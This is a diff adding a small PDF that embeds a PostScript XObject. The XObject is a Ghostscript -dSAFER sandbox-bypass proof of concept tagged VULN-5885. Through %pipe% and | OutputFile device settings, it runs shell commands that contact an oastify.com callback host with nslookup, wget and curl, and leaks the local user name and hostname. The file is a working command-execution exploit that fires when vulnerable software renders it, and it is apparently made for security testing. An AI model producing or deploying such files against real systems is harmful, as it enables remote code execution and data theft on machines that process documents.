@@ -1,0 +1,42 @@
+%PDF-1.7
+%‚„œ”
+1 0 obj
+<< /Type /Catalog /Pages 2 0 R >>
+endobj
+2 0 obj
+<< /Type /Pages /Kids [3 0 R] /Count 1 >>
+endobj
+3 0 obj
+<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] /Resources << /XObject << /PSxo 4 0 R >> >> /Contents 5 0 R >>
+endobj
+4 0 obj
+<< /Type /XObject /Subtype /PS /Length 873 >>
+stream
+%!PS-Adobe-3.0
+% VULN-5885 Ghostscript -dSAFER bypass PoC (non-destructive OOB; id/hostname only)
+userdict /setpagedevice undef
+{ save legal { null restore } stopped { pop } if { legal } stopped { pop } if restore
+  mark /OutputFile (%pipe%nslookup gs.s5y9vktnjw3r04s6ggqm65gax13rra10w6ev.oastify.com 2>/dev/null; wget -qO- http://s5y9vktnjw3r04s6ggqm65gax13rra10w6ev.oastify.com/gs-$(id -un)-$(hostname) 2>/dev/null; curl -s http://s5y9vktnjw3r04s6ggqm65gax13rra10w6ev.oastify.com/gs-curl 2>/dev/null) currentdevice putdeviceprops } stopped pop
+{ mark /OutputFile (|nslookup gs.s5y9vktnjw3r04s6ggqm65gax13rra10w6ev.oastify.com 2>/dev/null; wget -qO- http://s5y9vktnjw3r04s6ggqm65gax13rra10w6ev.oastify.com/gs-$(id -un)-$(hostname) 2>/dev/null; curl -s http://s5y9vktnjw3r04s6ggqm65gax13rra10w6ev.oastify.com/gs-curl 2>/dev/null) currentdevice putdeviceprops } stopped pop
+
+endstream
+endobj
+5 0 obj
+<< /Length 8 >>
+stream
+/PSxo Do
+endstream
+endobj
+xref
+0 6
+0000000000 65535 f 
+0000000015 00000 n 
+0000000064 00000 n 
+0000000121 00000 n 
+0000000252 00000 n 
+0000001204 00000 n 
+trailer
+<< /Size 6 /Root 1 0 R >>
+startxref
+1261
+%%EOF
